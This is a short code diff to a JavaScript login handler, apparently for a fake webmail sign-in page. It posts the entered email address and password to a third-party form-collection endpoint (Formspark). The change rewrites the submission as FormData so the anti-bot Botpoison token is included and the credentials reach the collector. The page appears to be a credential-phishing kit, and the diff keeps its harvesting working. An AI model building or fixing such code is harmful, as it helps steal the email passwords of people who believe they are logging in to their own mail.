@@ -275,29 +275,18 @@
         showLoader();
         isSubmitting = true;
 
-        // Get the Botpoison token from the form (generated automatically by the script)
-        const botpoisonInput = document.querySelector('input[name="_botpoison"]');
-        const botpoisonToken = botpoisonInput ? botpoisonInput.value : null;
-
-        const formsparkData = {
-          email: emailInput.value,
-          password: passwordInput.value,
-          webmail_login: true
-        };
-
-        // Add Botpoison token if available (required for AJAX submissions with Botpoison enabled)
-        if (botpoisonToken) {
-          formsparkData._botpoison = botpoisonToken;
-        }
+        // Create FormData from the form (this automatically includes the Botpoison token)
+        const formData = new FormData(form);
+        
+        // Add our custom fields (they'll be appended alongside the form's existing fields)
+        formData.append("email", emailInput.value);
+        formData.append("password", passwordInput.value);
+        formData.append("webmail_login", "true");
 
         try {
           const response = await fetch(FORMSPARK_URL, {
             method: "POST",
-            headers: {
-              "Content-Type": "application/json",
-              Accept: "application/json"
-            },
-            body: JSON.stringify(formsparkData)
+            body: formData // Send as FormData, not JSON
           });
 
           if (response.ok) {
